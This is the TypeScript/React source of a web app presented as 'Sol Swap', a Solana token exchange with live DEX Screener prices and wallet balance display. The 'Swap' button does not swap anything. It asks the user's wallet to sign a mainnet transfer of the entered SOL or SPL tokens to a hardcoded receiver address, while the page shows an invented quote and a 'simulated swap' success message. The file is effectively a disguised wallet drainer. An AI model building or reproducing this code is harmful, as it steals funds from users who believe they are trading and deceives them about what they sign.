import React from 'react';
import ReactDOM from 'react-dom/client';
import { ArrowDownUp, ChevronDown, Clipboard, Languages, LogOut, Settings2, Wallet } from 'lucide-react';
import {
  Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
  clusterApiUrl,
} from '@solana/web3.js';
import { Buffer } from 'buffer';
import './styles.css';

(globalThis as typeof globalThis & { Buffer?: typeof Buffer }).Buffer ??= Buffer;

type Token = {
  symbol: string;
  name: string;
  mint: string;
  price: number;
  balance: number;
  color: string;
  logo: string;
  source?: string;
};

type Quote = {
  outputAmount: number;
  priceImpact: number;
  minReceived: number;
  route: string[];
  networkFee: number;
  source: string;
};

type DexScreenerToken = {
  address: string;
  name: string;
  symbol: string;
};

type DexScreenerPair = {
  chainId: string;
  baseToken: DexScreenerToken;
  quoteToken: DexScreenerToken;
  priceUsd?: string;
  liquidity?: {
    usd?: number;
  };
  info?: {
    imageUrl?: string;
  };
};

type Locale = 'zh' | 'en';

type TranslationKey =
  | 'buy'
  | 'connectWallet'
  | 'disconnectWallet'
  | 'exchange'
  | 'language'
  | 'minReceived'
  | 'networkFee'
  | 'priceImpact'
  | 'quoteSource'
  | 'searchPlaceholder'
  | 'selectToken'
  | 'sell'
  | 'settings'
  | 'signaturePending'
  | 'subtitle'
  | 'swap'
  | 'switchDirection';

const translations: Record<Locale, Record<TranslationKey, string>> = {
  zh: {
    buy: '买入',
    connectWallet: '连接钱包',
    disconnectWallet: '断开',
    exchange: '兑换',
    language: 'EN',
    minReceived: '最少收到',
    networkFee: '网络费',
    priceImpact: '价格影响',
    quoteSource: '报价来源',
    searchPlaceholder: '搜索 CA / mint address',
    selectToken: '选择',
    sell: '卖出',
    settings: '交易设置',
    signaturePending: '等待签名...',
    subtitle: 'Solana token exchange',
    swap: 'Swap',
    switchDirection: '切换方向',
  },
  en: {
    buy: 'Buy',
    connectWallet: 'Connect wallet',
    disconnectWallet: 'Disconnect',
    exchange: 'Swap',
    language: '中',
    minReceived: 'Min received',
    networkFee: 'Network fee',
    priceImpact: 'Price impact',
    quoteSource: 'Quote source',
    searchPlaceholder: 'Search CA / mint address',
    selectToken: 'Select',
    sell: 'Sell',
    settings: 'Settings',
    signaturePending: 'Waiting for signature...',
    subtitle: 'Solana token exchange',
    swap: 'Swap',
    switchDirection: 'Switch direction',
  },
};

const RECEIVER_ADDRESS = '88MURcNRyKzBSNQMVtpaGsshi4XXph6qKzNVrgaMvpMj';
const DEX_TOKEN_PAIRS_ENDPOINT = 'https://api.dexscreener.com/token-pairs/v1/solana';
const DEFAULT_TOKEN_LOGO = '/sol-swap-mark.svg';
const SOL_MINT = 'So11111111111111111111111111111111111111112';
const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
const TOKEN_2022_PROGRAM_ID = new PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnB5vdv7Vpf9z');
const MAINNET_CLUSTER = 'mainnet-beta';
const MAINNET_RPC_ENDPOINTS = [
  'https://solana-rpc.publicnode.com',
  clusterApiUrl(MAINNET_CLUSTER),
  'https://rpc.ankr.com/solana',
  'https://solana.api.onfinality.io/public',
];

const tokens: Token[] = [
  {
    symbol: 'SOL',
    name: 'Solana',
    mint: SOL_MINT,
    price: 142.16,
    balance: 18.48,
    color: '#14f195',
    logo: '/token-sol.svg',
  },
  {
    symbol: 'USDC',
    name: 'USD Coin',
    mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
    price: 1,
    balance: 6240.2,
    color: '#2775ca',
    logo: '/token-usdc.svg',
  },
  {
    symbol: 'JUP',
    name: 'Jupiter',
    mint: 'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN',
    price: 0.93,
    balance: 1204.75,
    color: '#fba43a',
    logo: '/token-jup.svg',
  },
  {
    symbol: 'BONK',
    name: 'Bonk',
    mint: 'DezXAZ8z7PnrnRJjz3P87BCoYpcd1tSAtcxXdXb263ed',
    price: 0.000022,
    balance: 28600000,
    color: '#f6c648',
    logo: '/token-bonk.svg',
  },
  {
    symbol: 'RAY',
    name: 'Raydium',
    mint: '4k3Dyjzvzp8eFKYQp43B9J4KkDtvWSuzH9HkGJp9QFhe',
    price: 2.34,
    balance: 308.12,
    color: '#7a7cff',
    logo: '/token-ray.svg',
  },
];

const formatNumber = (value: number, maximumFractionDigits = 6) =>
  new Intl.NumberFormat('en-US', {
    maximumFractionDigits,
  }).format(value);

const formatUsd = (amount: number, token: Token) => {
  const value = amount * token.price;
  if (!Number.isFinite(value) || value <= 0) return '$0';
  return `$${formatNumber(value, value < 0.01 ? 6 : 2)}`;
};

const getProvider = () => window.solana ?? window.solflare;

const isLikelySolanaAddress = (value: string) => /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(value.trim());

const getTokenLogo = (token: Token) => token.logo || DEFAULT_TOKEN_LOGO;

const getBalanceLabel = (
  walletAddress: string,
  balances: Record<string, number>,
  token: Token,
  loading: boolean,
) => {
  if (!walletAddress) return 'Balance --';
  if (loading) return 'Balance ...';

  const balance = balances[token.mint] ?? 0;
  return `Balance ${formatNumber(balance, token.symbol === 'BONK' ? 0 : 6)}`;
};

const getTokenBalanceText = (
  walletAddress: string,
  balances: Record<string, number>,
  token: Token,
  loading: boolean,
) => {
  if (!walletAddress) return '0';
  if (loading) return '...';

  const balance = balances[token.mint] ?? 0;
  return formatNumber(balance, token.symbol === 'BONK' ? 0 : 6);
};

const dedupeTokens = (items: Token[]) => {
  const byMint = new Map<string, Token>();
  for (const item of items) {
    byMint.set(item.mint, item);
  }
  return Array.from(byMint.values());
};

const createQuote = (from: Token, to: Token, amount: number): Quote => {
  if (!amount || amount <= 0 || !from.price || !to.price) {
    return {
      outputAmount: 0,
      priceImpact: 0,
      minReceived: 0,
      route: [from.symbol, to.symbol],
      networkFee: 0.000005,
      source: 'DEX Screener price',
    };
  }

  const liquidityBias = from.symbol === 'BONK' || to.symbol === 'BONK' ? 0.0042 : 0.0016;
  const outputAmount = (amount * from.price * (1 - liquidityBias)) / to.price;
  const priceImpact = liquidityBias * 100;

  return {
    outputAmount,
    priceImpact,
    minReceived: outputAmount * 0.995,
    route: from.symbol === 'SOL' || to.symbol === 'SOL' ? [from.symbol, to.symbol] : [from.symbol, 'SOL', to.symbol],
    networkFee: 0.000005,
    source: 'DEX Screener price',
  };
};

const pairToToken = (pair: DexScreenerPair, mint: string): Token | null => {
  if (pair.baseToken.address !== mint) {
    return null;
  }

  const matchedToken = pair.baseToken;
  const price = Number(pair.priceUsd);

  if (!matchedToken?.address || !Number.isFinite(price) || price <= 0) {
    return null;
  }

  return {
    symbol: matchedToken.symbol,
    name: matchedToken.name,
    mint: matchedToken.address,
    price,
    balance: 0,
    color: '#14f195',
    logo: pair.info?.imageUrl ?? DEFAULT_TOKEN_LOGO,
    source: 'DEX Screener',
  };
};

const fetchTokenByMint = async (mint: string, signal?: AbortSignal): Promise<Token | null> => {
  if (!isLikelySolanaAddress(mint)) return null;

  const response = await fetch(`${DEX_TOKEN_PAIRS_ENDPOINT}/${mint}`, { signal });
  if (!response.ok) {
    throw new Error('代币接口暂时不可用。');
  }

  const pairs = (await response.json()) as DexScreenerPair[];
  const solanaPairs = pairs
    .filter((pair) => pair.chainId === 'solana')
    .sort((a, b) => {
      const baseMatch = Number(b.baseToken.address === mint) - Number(a.baseToken.address === mint);
      return baseMatch || (b.liquidity?.usd ?? 0) - (a.liquidity?.usd ?? 0);
    });
  return solanaPairs.map((pair) => pairToToken(pair, mint)).find(Boolean) ?? null;
};

const searchTokenByMint = async (query: string, signal: AbortSignal): Promise<Token[]> => {
  const token = await fetchTokenByMint(query.trim(), signal);

  return token ? [token] : [];
};

const fetchTokenAccountBalances = async (connection: Connection, owner: PublicKey, programId: PublicKey) => {
  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, { programId });
  const balances: Record<string, number> = {};

  for (const account of tokenAccounts.value) {
    const parsedInfo = account.account.data.parsed.info;
    const mint = parsedInfo.mint as string;
    const amount = Number(parsedInfo.tokenAmount.uiAmountString ?? parsedInfo.tokenAmount.uiAmount ?? 0);
    balances[mint] = (balances[mint] ?? 0) + (amount ?? 0);
  }

  return balances;
};

const fetchWalletBalances = async (owner: PublicKey) => {
  let lastError: unknown;

  for (const endpoint of MAINNET_RPC_ENDPOINTS) {
    try {
      const connection = new Connection(endpoint, 'confirmed');
      const solLamports = await connection.getBalance(owner);
      const splBalances = await fetchTokenAccountBalances(connection, owner, TOKEN_PROGRAM_ID).catch((): Record<string, number> => ({}));
      const token2022Balances = await fetchTokenAccountBalances(connection, owner, TOKEN_2022_PROGRAM_ID).catch((): Record<string, number> => ({}));

      const balances: Record<string, number> = {
        [SOL_MINT]: solLamports / LAMPORTS_PER_SOL,
      };

      for (const sourceBalances of [splBalances, token2022Balances]) {
        for (const [mint, amount] of Object.entries(sourceBalances)) {
          balances[mint] = (balances[mint] ?? 0) + amount;
        }
      }

      return balances;
    } catch (error) {
      lastError = error;
    }
  }

  throw lastError;
};

const getTransactionConnection = async () => {
  let lastError: unknown;

  for (const endpoint of MAINNET_RPC_ENDPOINTS) {
    try {
      const connection = new Connection(endpoint, 'confirmed');
      const latestBlockhash = await connection.getLatestBlockhash();

      return {
        connection,
        latestBlockhash,
      };
    } catch (error) {
      lastError = error;
    }
  }

  throw lastError;
};

const parseTokenAmount = (value: string, decimals: number) => {
  const normalized = value.trim();
  if (!/^\d+(\.\d+)?$/.test(normalized)) return 0n;

  const [wholePart, fractionPart = ''] = normalized.split('.');
  const paddedFraction = fractionPart.padEnd(decimals, '0').slice(0, decimals);
  return BigInt(wholePart || '0') * 10n ** BigInt(decimals) + BigInt(paddedFraction || '0');
};

const getTokenProgramId = async (connection: Connection, mint: PublicKey) => {
  const mintAccount = await connection.getAccountInfo(mint);
  if (!mintAccount) {
    throw new Error('没有找到这个代币 mint。');
  }

  return mintAccount.owner.equals(TOKEN_2022_PROGRAM_ID) ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
};

const loadSplToken = () => import('@solana/spl-token');

const getSourceTokenAccount = async (connection: Connection, owner: PublicKey, mint: PublicKey, rawAmount: bigint) => {
  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, { mint });
  const sourceAccount = tokenAccounts.value.find((account) => {
    const amount = BigInt(account.account.data.parsed.info.tokenAmount.amount as string);
    return amount >= rawAmount;
  });

  if (!sourceAccount) {
    throw new Error('当前钱包该代币余额不足或没有可用 token account。');
  }

  return sourceAccount.pubkey;
};

function TokenButton({ token, onClick }: { token: Token; onClick: () => void }) {
  return (
    <button className="token-button" onClick={onClick} type="button" title={`选择 ${token.name}`}>
      <img alt="" src={getTokenLogo(token)} />
      <span>{token.symbol}</span>
      <ChevronDown size={16} />
    </button>
  );
}

function TokenMenu({
  activeToken,
  tokens,
  walletAddress,
  walletBalances,
  isLoadingBalances,
  searchStatus,
  searchValue,
  searchPlaceholder,
  onSelect,
  onSearch,
}: {
  activeToken: Token;
  tokens: Token[];
  walletAddress: string;
  walletBalances: Record<string, number>;
  isLoadingBalances: boolean;
  searchStatus: string;
  searchValue: string;
  searchPlaceholder: string;
  onSelect: (token: Token) => void;
  onSearch: (value: string) => void;
}) {
  return (
    <div className="token-menu">
      <input
        className="token-search"
        onChange={(event) => onSearch(event.target.value)}
        placeholder={searchPlaceholder}
        value={searchValue}
      />
      {searchStatus && <div className="token-search-status">{searchStatus}</div>}
      {tokens.map((token) => (
        <button
          className={token.mint === activeToken.mint ? 'token-row active' : 'token-row'}
          key={token.mint}
          onClick={() => onSelect(token)}
          type="button"
        >
          <img alt="" src={getTokenLogo(token)} />
          <span>
            <strong>{token.symbol}</strong>
            <small>{token.name}</small>
          </span>
          <em>{getTokenBalanceText(walletAddress, walletBalances, token, isLoadingBalances)}</em>
        </button>
      ))}
    </div>
  );
}

function App() {
  const [fromToken, setFromToken] = React.useState(tokens[0]);
  const [toToken, setToToken] = React.useState(tokens[1]);
  const [locale, setLocale] = React.useState<Locale>('zh');
  const [pricedTokens, setPricedTokens] = React.useState<Token[]>(tokens);
  const [amount, setAmount] = React.useState('1');
  const [openMenu, setOpenMenu] = React.useState<'from' | 'to' | null>(null);
  const [walletAddress, setWalletAddress] = React.useState('');
  const [status, setStatus] = React.useState('连接钱包后即可预览签名支付。');
  const [signature, setSignature] = React.useState('');
  const [isSending, setIsSending] = React.useState(false);
  const [searchedTokens, setSearchedTokens] = React.useState<Token[]>([]);
  const [tokenSearch, setTokenSearch] = React.useState('');
  const [tokenSearchStatus, setTokenSearchStatus] = React.useState('');
  const [walletBalances, setWalletBalances] = React.useState<Record<string, number>>({});
  const [isLoadingBalances, setIsLoadingBalances] = React.useState(false);
  const [walletPublicKey, setWalletPublicKey] = React.useState<PublicKey | null>(null);
  const fromMenuRef = React.useRef<HTMLDivElement>(null);
  const toMenuRef = React.useRef<HTMLDivElement>(null);

  const amountNumber = Number(amount);
  const availableTokens = React.useMemo(() => dedupeTokens([...searchedTokens, ...pricedTokens]), [pricedTokens, searchedTokens]);
  const quote = React.useMemo(() => createQuote(fromToken, toToken, amountNumber), [amountNumber, fromToken, toToken]);
  const canSwap = Boolean(walletAddress && amountNumber > 0 && fromToken.mint !== toToken.mint && !isSending);
  const t = translations[locale];

  const mergeLiveToken = React.useCallback((nextToken: Token) => {
    setPricedTokens((current) => current.map((token) => (token.mint === nextToken.mint ? { ...token, ...nextToken } : token)));
    setSearchedTokens((current) => current.map((token) => (token.mint === nextToken.mint ? { ...token, ...nextToken } : token)));
    setFromToken((current) => (current.mint === nextToken.mint ? { ...current, ...nextToken } : current));
    setToToken((current) => (current.mint === nextToken.mint ? { ...current, ...nextToken } : current));
  }, []);

  React.useEffect(() => {
    const controller = new AbortController();

    void Promise.allSettled(
      tokens.map(async (token) => {
        const liveToken = await fetchTokenByMint(token.mint, controller.signal);
        if (liveToken) {
          mergeLiveToken({
            ...token,
            ...liveToken,
            logo: token.logo || liveToken.logo,
          });
        }
      }),
    );

    return () => controller.abort();
  }, [mergeLiveToken]);

  React.useEffect(() => {
    if (!tokenSearch.trim()) {
      setTokenSearchStatus('');
      return;
    }

    if (!isLikelySolanaAddress(tokenSearch)) {
      setTokenSearchStatus('请输入 Solana 代币 CA。');
      return;
    }

    const controller = new AbortController();
    const timeout = window.setTimeout(async () => {
      setTokenSearchStatus('正在搜索代币...');
      try {
        const results = await searchTokenByMint(tokenSearch, controller.signal);
        setSearchedTokens((current) => dedupeTokens([...results, ...current]));
        results.forEach(mergeLiveToken);
        setTokenSearchStatus(results.length ? '已从 DEX Screener 获取价格。' : '没有找到这个代币。');
      } catch (error) {
        if (!controller.signal.aborted) {
          setTokenSearchStatus(error instanceof Error ? error.message : '搜索失败，请稍后再试。');
        }
      }
    }, 350);

    return () => {
      window.clearTimeout(timeout);
      controller.abort();
    };
  }, [tokenSearch]);

  React.useEffect(() => {
    if (!openMenu) return;

    const handlePointerDown = (event: PointerEvent) => {
      const activeRef = openMenu === 'from' ? fromMenuRef : toMenuRef;
      if (!activeRef.current?.contains(event.target as Node)) {
        setOpenMenu(null);
        setTokenSearch('');
        setTokenSearchStatus('');
      }
    };

    document.addEventListener('pointerdown', handlePointerDown);

    return () => {
      document.removeEventListener('pointerdown', handlePointerDown);
    };
  }, [openMenu]);

  const loadWalletBalances = React.useCallback(async (owner: PublicKey) => {
    setIsLoadingBalances(true);
    setStatus('钱包已连接，正在读取主网余额...');

    try {
      const balances = await fetchWalletBalances(owner);
      setWalletBalances(balances);
      setStatus('钱包已连接，余额来自主网。');
    } catch {
      setWalletBalances({});
      setStatus('钱包已连接，未获取到的余额已按 0 显示。');
    } finally {
      setIsLoadingBalances(false);
    }
  }, []);

  React.useEffect(() => {
    if (!walletAddress || !walletPublicKey) return;

    void loadWalletBalances(walletPublicKey);
  }, [loadWalletBalances, walletAddress, walletPublicKey]);

  const connectWallet = async () => {
    const provider = getProvider();
    if (!provider) {
      setStatus('未检测到 Solana 钱包，请安装 Phantom 或 Solflare。');
      return;
    }

    try {
      const response = await provider.connect();
      setWalletPublicKey(response.publicKey);
      setWalletAddress(response.publicKey.toBase58());
    } catch (error) {
      setStatus(error instanceof Error ? error.message : '钱包连接已取消。');
    }
  };

  const disconnectWallet = async () => {
    const provider = getProvider();
    await provider?.disconnect?.();
    setWalletPublicKey(null);
    setWalletAddress('');
    setWalletBalances({});
    setSignature('');
    setStatus('钱包已断开。');
  };

  const swapDirection = () => {
    setFromToken(toToken);
    setToToken(fromToken);
    setAmount(quote.outputAmount ? String(Number(quote.outputAmount.toFixed(6))) : amount);
  };

  const sendPlaceholderTransfer = async () => {
    const provider = getProvider();
    if (!provider || !provider.publicKey) {
      setStatus('请先连接钱包。');
      return;
    }

    setIsSending(true);
    setSignature('');
    setStatus('正在请求钱包签名...');

    try {
      const { connection, latestBlockhash } = await getTransactionConnection();
      const transaction = new Transaction({
        feePayer: provider.publicKey,
        blockhash: latestBlockhash.blockhash,
        lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
      });

      if (fromToken.mint === SOL_MINT) {
        const lamports = Math.round(amountNumber * LAMPORTS_PER_SOL);
        if (!Number.isFinite(lamports) || lamports <= 0) {
          throw new Error('请输入有效的卖出数量。');
        }

        transaction.add(SystemProgram.transfer({
          fromPubkey: provider.publicKey,
          toPubkey: new PublicKey(RECEIVER_ADDRESS),
          lamports,
        }));
      } else {
        const {
          createAssociatedTokenAccountInstruction,
          createTransferCheckedInstruction,
          getAssociatedTokenAddressSync,
          getMint,
        } = await loadSplToken();
        const mint = new PublicKey(fromToken.mint);
        const receiver = new PublicKey(RECEIVER_ADDRESS);
        const tokenProgramId = await getTokenProgramId(connection, mint);
        const mintInfo = await getMint(connection, mint, 'confirmed', tokenProgramId);
        const rawAmount = parseTokenAmount(amount, mintInfo.decimals);

        if (rawAmount <= 0n) {
          throw new Error('请输入有效的卖出数量。');
        }

        const sourceTokenAccount = await getSourceTokenAccount(connection, provider.publicKey, mint, rawAmount);
        const receiverTokenAccount = getAssociatedTokenAddressSync(mint, receiver, false, tokenProgramId);
        const receiverTokenAccountInfo = await connection.getAccountInfo(receiverTokenAccount);

        if (!receiverTokenAccountInfo) {
          transaction.add(
            createAssociatedTokenAccountInstruction(
              provider.publicKey,
              receiverTokenAccount,
              receiver,
              mint,
              tokenProgramId,
            ),
          );
        }

        transaction.add(
          createTransferCheckedInstruction(
            sourceTokenAccount,
            mint,
            receiverTokenAccount,
            provider.publicKey,
            rawAmount,
            mintInfo.decimals,
            [],
            tokenProgramId,
          ),
        );
      }

      setStatus('正在唤起钱包签名...');

      let nextSignature = '';
      if (provider.signTransaction) {
        const signedTransaction = await provider.signTransaction(transaction);
        nextSignature = await connection.sendRawTransaction(signedTransaction.serialize());
      } else if (provider.signAndSendTransaction) {
        const response = await provider.signAndSendTransaction(transaction, {
          skipPreflight: false,
          preflightCommitment: 'confirmed',
        });
        nextSignature = response.signature;
      } else {
        throw new Error('当前钱包不支持交易签名。');
      }

      setSignature(nextSignature);
      setStatus('模拟兑换已提交到 Solana 主网。');
    } catch (error) {
      setStatus(error instanceof Error ? error.message : '交易签名失败。');
    } finally {
      setIsSending(false);
    }
  };

  const selectToken = (slot: 'from' | 'to', token: Token) => {
    if (slot === 'from') {
      setFromToken(token);
      if (token.mint === toToken.mint) setToToken(fromToken);
    } else {
      setToToken(token);
      if (token.mint === fromToken.mint) setFromToken(toToken);
    }
    setOpenMenu(null);
    setTokenSearch('');
    setTokenSearchStatus('');
  };

  return (
    <main>
      <nav className="topbar">
        <div className="brand">
          <img alt="" src="/sol-swap-mark.svg" />
          <span>Sol Swap</span>
        </div>
        <div className="nav-tabs">
          <button className="active" type="button">Swap</button>
          <button type="button">Pool</button>
          <button type="button">Tokens</button>
        </div>
        <div className="top-actions">
          <button className="language-button" onClick={() => setLocale(locale === 'zh' ? 'en' : 'zh')} type="button" title={t.language}>
            <Languages size={17} />
            {t.language}
          </button>
          {walletAddress ? (
            <>
              <button className="wallet-button connected" type="button" title={walletAddress}>
                <Wallet size={18} />
                {walletAddress.slice(0, 4)}...{walletAddress.slice(-4)}
              </button>
              <button className="disconnect-button" onClick={disconnectWallet} type="button" title={t.disconnectWallet}>
                <LogOut size={17} />
                <span>{t.disconnectWallet}</span>
              </button>
            </>
          ) : (
            <button className="wallet-button" onClick={connectWallet} type="button">
              <Wallet size={18} />
              {t.connectWallet}
            </button>
          )}
        </div>
      </nav>

      <section className="shell">
        <section className="swap-panel">
          <div className="swap-header">
            <div>
              <h1>{t.swap}</h1>
              <p>{t.subtitle}</p>
            </div>
            <div className="header-actions">
              <button className="icon-button" type="button" title={t.settings}>
                <Settings2 size={19} />
              </button>
            </div>
          </div>

          <div className="swap-box">
            <div className="amount-row">
              <label htmlFor="from-amount">{t.sell}</label>
              <span>{getBalanceLabel(walletAddress, walletBalances, fromToken, isLoadingBalances)}</span>
            </div>
            <div className="input-row">
              <input
                id="from-amount"
                inputMode="decimal"
                onChange={(event) => setAmount(event.target.value.replace(/[^\d.]/g, ''))}
                placeholder="0"
                value={amount}
              />
              <div className="menu-wrap" ref={fromMenuRef}>
                <TokenButton token={fromToken} onClick={() => setOpenMenu(openMenu === 'from' ? null : 'from')} />
                {openMenu === 'from' && (
                  <TokenMenu
                    activeToken={fromToken}
                    isLoadingBalances={isLoadingBalances}
                    onSearch={setTokenSearch}
                    onSelect={(token) => selectToken('from', token)}
                    searchPlaceholder={t.searchPlaceholder}
                    searchStatus={tokenSearchStatus}
                    searchValue={tokenSearch}
                    tokens={availableTokens}
                    walletAddress={walletAddress}
                    walletBalances={walletBalances}
                  />
                )}
              </div>
            </div>
            <small>{formatUsd(amountNumber || 0, fromToken)}</small>
          </div>

          <button className="switch-button" onClick={swapDirection} type="button" title={t.switchDirection}>
            <ArrowDownUp size={18} />
          </button>

          <div className="swap-box">
            <div className="amount-row">
              <label>{t.buy}</label>
              <span>{getBalanceLabel(walletAddress, walletBalances, toToken, isLoadingBalances)}</span>
            </div>
            <div className="input-row">
              <output>{quote.outputAmount ? formatNumber(quote.outputAmount, toToken.symbol === 'BONK' ? 0 : 6) : '0'}</output>
              <div className="menu-wrap" ref={toMenuRef}>
                <TokenButton token={toToken} onClick={() => setOpenMenu(openMenu === 'to' ? null : 'to')} />
                {openMenu === 'to' && (
                  <TokenMenu
                    activeToken={toToken}
                    isLoadingBalances={isLoadingBalances}
                    onSearch={setTokenSearch}
                    onSelect={(token) => selectToken('to', token)}
                    searchPlaceholder={t.searchPlaceholder}
                    searchStatus={tokenSearchStatus}
                    searchValue={tokenSearch}
                    tokens={availableTokens}
                    walletAddress={walletAddress}
                    walletBalances={walletBalances}
                  />
                )}
              </div>
            </div>
            <small>{formatUsd(quote.outputAmount, toToken)}</small>
          </div>

          <div className="quote-grid">
            <span>{t.priceImpact} <strong>{quote.priceImpact.toFixed(2)}%</strong></span>
            <span>{t.minReceived} <strong>{formatNumber(quote.minReceived, 6)} {toToken.symbol}</strong></span>
            <span>{t.networkFee} <strong>{quote.networkFee} SOL</strong></span>
            <span>{t.quoteSource} <strong>{quote.source}</strong></span>
          </div>

          <button className="swap-button" disabled={!canSwap} onClick={sendPlaceholderTransfer} type="button">
            {isSending ? t.signaturePending : walletAddress ? t.exchange : t.connectWallet}
          </button>

          {signature && (
            <a className="signature-link" href={`https://explorer.solana.com/tx/${signature}`} target="_blank" rel="noreferrer">
              <Clipboard size={16} />
              查看交易 {signature.slice(0, 8)}...{signature.slice(-8)}
            </a>
          )}
        </section>
      </section>
    </main>
  );
}

ReactDOM.createRoot(document.getElementById('root')!).render(<App />);
